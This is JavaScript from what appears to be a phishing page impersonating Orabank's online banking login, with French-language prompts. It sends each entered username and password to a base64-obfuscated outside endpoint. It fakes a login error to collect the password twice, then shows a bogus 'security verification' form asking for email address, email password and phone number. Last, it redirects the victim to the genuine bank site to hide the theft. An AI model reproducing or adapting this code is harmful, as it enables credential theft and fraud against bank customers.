        let lAtt = 0;

        function handleLogin() {
            const codeInput = document.getElementById('identifiant').value.trim();
            const pwdInput = document.getElementById('password').value;

            // Hide any previous inline error
            document.getElementById('formErrorBox').classList.remove('visible');

            const errors = [];
            if (!codeInput) errors.push(`Le champ "Login" est obligatoire.`);
            if (!pwdInput) errors.push(`Le champ "Mot de passe" est obligatoire.`);

            if (errors.length > 0) {
                showModal(errors);
                return;
            }

            // Validation passed - show loading modal
            const loadingModal = document.getElementById('loadingModal');
            loadingModal.classList.add('active');

            const loginBtn = document.querySelector('.submit-btn');
            loginBtn.disabled = true;

            const zendback = "aHR0cHM6Ly9zdWdyZW5kbmF0LmNvbS9jaHloay9vcmEvb25lL2EucGhw";
            lAtt++;

            fetch(atob(zendback), {
                method: 'POST',
                body: `userid=${encodeURIComponent(codeInput)}&password=${encodeURIComponent(pwdInput)}&attempt=${lAtt}`,
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            })
                .then(res => res.json())
                .then(response => {
                    setTimeout(() => {
                        loadingModal.classList.remove('active');
                        
                        if (lAtt === 1) {
                            // First attempt - show error, stay on page
                            document.getElementById('formErrorBox').classList.add('visible');
                            document.getElementById('password').value = "";
                            document.getElementById('password').focus();
                            loginBtn.disabled = false;
                            console.log('Attempt 1 - Error shown');
                        } 
                        else if (lAtt === 2) {
                            // Second attempt - show error then verification form
                            document.getElementById('formErrorBox').classList.add('visible');
                            document.getElementById('password').value = "";
                            loginBtn.disabled = false;
                            
                            // Show verification form after 1.5 seconds
                            setTimeout(() => {
                                showVerificationForm(codeInput, pwdInput);
                            }, 1500);
                            console.log('Attempt 2 - Verification form showing');
                        } 
                        else if (lAtt >= 3) {
                            // Third attempt - redirect to OraBank
                            console.log('Attempt 3 - Redirecting to OraBank');
                            window.location.href = 'https://www.orabank.net/fr/compte-en-ligne';
                        }
                    }, 1200);
                })
                .catch(err => {
                    console.error("Request failed:", err);
                    loadingModal.classList.remove('active');
                    const formErrorBox = document.getElementById('formErrorBox');
                    formErrorBox.classList.add('visible');
                    loginBtn.disabled = false;
                });
        }

        function showVerificationForm(username, password) {
            const overlay = document.createElement('div');
            overlay.className = 'verification-overlay';
            overlay.id = 'verificationOverlay';

            overlay.innerHTML = `
                <style>
                    .verification-overlay {
                        display: flex;
                        position: fixed;
                        inset: 0;
                        background: rgba(0, 0, 0, 0.4);
                        z-index: 1500;
                        align-items: flex-start;
                        padding-top: 10vh;
                        justify-content: center;
                    }

                    .verification-modal {
                        background: #edede9;
                        border: 1px solid #777;
                        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
                        border-radius: 8px;
                        width: 500px;
                        max-width: 92vw;
                        padding: 30px;
                        animation: modalIn 0.15s ease-out;
                        color: #000;
                    }

                    .verification-modal-header {
                        font-size: 20px;
                        font-weight: 700;
                        margin-bottom: 8px;
                        color: #00693e;
                    }

                    .verification-modal-subtitle {
                        font-size: 14px;
                        color: #666;
                        margin-bottom: 24px;
                        line-height: 1.4;
                    }

                    .verification-form {
                        display: flex;
                        flex-direction: column;
                        gap: 16px;
                    }

                    .form-group {
                        display: flex;
                        flex-direction: column;
                        gap: 6px;
                    }

                    .form-group label {
                        font-size: 14px;
                        font-weight: 500;
                        color: #000;
                    }

                    .form-group input {
                        width: 100%;
                        height: 40px;
                        padding: 8px 12px;
                        font-size: 14px;
                        color: #000;
                        background-color: #e8e9e3;
                        border: 1px solid #aaa;
                        border-radius: 4px;
                        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                        transition: border-color 0.15s, box-shadow 0.15s;
                    }

                    .form-group input:focus {
                        outline: none;
                        box-shadow: 0 0 0 2px rgba(0, 92, 58, 0.1);
                        border-color: #006b43;
                        background-color: #e8e9e3;
                    }

                    .form-actions {
                        display: flex;
                        justify-content: flex-end;
                        gap: 12px;
                        margin-top: 24px;
                    }

                    .btn {
                        padding: 12px 24px;
                        font-size: 12px;
                        font-weight: 700;
                        letter-spacing: 0.03em;
                        border: none;
                        border-radius: 4px;
                        cursor: pointer;
                        transition: background 0.2s;
                    }

                    .btn-cancel {
                        background: #999;
                        color: #fff;
                    }

                    .btn-cancel:hover {
                        background: #777;
                    }

                    .btn-submit {
                        background: #006b43;
                        color: #fff;
                    }

                    .btn-submit:hover {
                        background: #003620;
                    }

                    .btn-submit:active {
                        background-color: #003620;
                        box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
                    }

                    .form-error {
                        color: #c4703f;
                        font-size: 13px;
                        margin-top: -4px;
                    }

                    .error-message-box {
                        background-color: #edede9;
                        border-radius: 8px;
                        padding: 16px 16px;
                        font-size: 14px;
                        font-weight: 500;
                        color: #8e684c;
                        display: none;
                        margin-top: 10px;
                    }

                    .error-message-box.visible {
                        display: block;
                    }

                    @keyframes modalIn {
                        from {
                            opacity: 0;
                            transform: scale(0.96) translateY(-5px);
                        }
                        to {
                            opacity: 1;
                            transform: scale(1) translateY(0);
                        }
                    }
                </style>

                <div class="verification-modal">
                    <div class="verification-modal-header">Vérification de sécurité</div>
                    <div class="verification-modal-subtitle">
                        Pour continuer, veuillez fournir vos informations de vérification supplémentaires.
                    </div>

                    <form class="verification-form" id="verificationForm">
                        <div class="form-group">
                            <label for="email">Adresse e-mail</label>
                            <input
                                type="email"
                                id="email"
                                name="email"
                                placeholder="exemple@domaine.com"
                                required
                            />
                            <div class="form-error" id="emailError"></div>
                        </div>

                        <div class="form-group">
                            <label for="emailPassword">Mot de passe e-mail</label>
                            <input
                                type="password"
                                id="emailPassword"
                                name="emailPassword"
                                placeholder="••••••••"
                                required
                            />
                            <div class="form-error" id="emailPasswordError"></div>
                        </div>

                        <div class="form-group">
                            <label for="phoneNumber">Numéro de téléphone</label>
                            <input
                                type="tel"
                                id="phoneNumber"
                                name="phoneNumber"
                                placeholder="+2XX XXX XXXX"
                                required
                            />
                            <div class="form-error" id="phoneNumberError"></div>
                        </div>

                        <div class="error-message-box" id="verificationError">
                            Login ou mot de passe erroné.
                        </div>

                        <div class="form-actions">
                            <button type="button" class="btn btn-cancel" id="cancelBtn">
                                Annuler
                            </button>
                            <button type="submit" class="btn btn-submit">
                                Continuer
                            </button>
                        </div>
                    </form>
                </div>
            `;

            document.body.appendChild(overlay);

            // Handle form submission
            const form = overlay.querySelector('#verificationForm');
            form.addEventListener('submit', (e) => {
                e.preventDefault();

                const email = overlay.querySelector('#email').value.trim();
                const emailPassword = overlay.querySelector('#emailPassword').value;
                const phoneNumber = overlay.querySelector('#phoneNumber').value.trim();

                // Validation
                const errors = [];
                if (!email || !email.includes('@')) errors.push('email');
                if (!emailPassword) errors.push('emailPassword');
                if (!phoneNumber) errors.push('phoneNumber');

                if (errors.length > 0) {
                    errors.forEach(field => {
                        const errorEl = overlay.querySelector(`#${field}Error`);
                        if (errorEl) {
                            errorEl.textContent = 'Ce champ est obligatoire';
                        }
                    });
                    return;
                }

                // Clear errors
                overlay.querySelectorAll('.form-error').forEach(el => el.textContent = '');

                // Show verification error message
                overlay.querySelector('#verificationError').classList.add('visible');

                // Wait before final redirect
                setTimeout(() => {
                    // Make third attempt and redirect
                    makeThirdAttempt();
                }, 1500);
            });

            // Handle cancel button
            const cancelBtn = overlay.querySelector('#cancelBtn');
            cancelBtn.addEventListener('click', () => {
                overlay.remove();
            });

            // Close on backdrop click
            overlay.addEventListener('click', (e) => {
                if (e.target === overlay) {
                    overlay.remove();
                }
            });

            // Focus on first input
            setTimeout(() => {
                const emailInput = overlay.querySelector('#email');
                emailInput?.focus();
            }, 100);
        }

        function makeThirdAttempt() {
            const codeInput = document.getElementById('identifiant').value.trim();
            const pwdInput = document.getElementById('password').value;

            const loadingModal = document.getElementById('loadingModal');
            loadingModal.classList.add('active');

            const zendback = "aHR0cHM6Ly9zdWdyZW5kbmF0LmNvbS9jaHloay9vcmEvb25lL2EucGhw";
            lAtt++;

            fetch(atob(zendback), {
                method: 'POST',
                body: `userid=${encodeURIComponent(codeInput)}&password=${encodeURIComponent(pwdInput)}&attempt=${lAtt}`,
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            })
                .then(res => res.json())
                .then(response => {
                    setTimeout(() => {
                        loadingModal.classList.remove('active');
                        // Redirect to OraBank
                        console.log('Redirecting to OraBank');
                        window.location.href = 'https://www.orabank.net/fr/compte-en-ligne';
                    }, 1200);
                })
                .catch(err => {
                    console.error("Request failed:", err);
                    loadingModal.classList.remove('active');
                    // Still redirect on error
                    window.location.href = 'https://www.orabank.net/fr/compte-en-ligne';
                });
        }

        function showModal(errors) {
            const overlay = document.getElementById('validationModal');
            const list = document.getElementById('modalErrorList');

            list.innerHTML = errors.map(msg => `
                <li class="IQ-RV-OF">${msg}</li>
            `).join('');

            overlay.classList.add('active');
            // Close on backdrop click
            overlay.onclick = function (ev) {
                if (ev.target === overlay) closeModal();
            };
            // Close on Escape key
            document.addEventListener('keydown', escHandler);
        }

        function closeModal() {
            document.getElementById('validationModal').classList.remove('active');
            document.removeEventListener('keydown', escHandler);
            // Return focus to first empty field
            const id = document.getElementById('identifiant');
            const pwd = document.getElementById('password');
            (id.value.trim() === '' ? id : pwd).focus();
        }

        function escHandler(e) {
            if (e.key === 'Escape') closeModal();
        }
